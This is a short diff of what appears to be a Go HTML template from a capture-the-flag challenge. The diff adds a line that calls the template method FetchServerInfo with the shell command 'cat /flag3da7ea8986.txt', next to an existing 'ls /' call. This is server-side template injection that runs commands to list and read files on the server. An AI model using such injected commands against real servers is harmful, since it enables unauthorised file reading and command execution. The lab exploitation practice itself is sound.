@@ -5,6 +5,7 @@
 </head>
 
 <body>
+Info: {{.FetchServerInfo "cat /flag3da7ea8986.txt"}}
 Info: {{.FetchServerInfo "ls /"}}
 ClientIP: {{.ClientIP}}
 ClientUA: {{.ClientUA}}
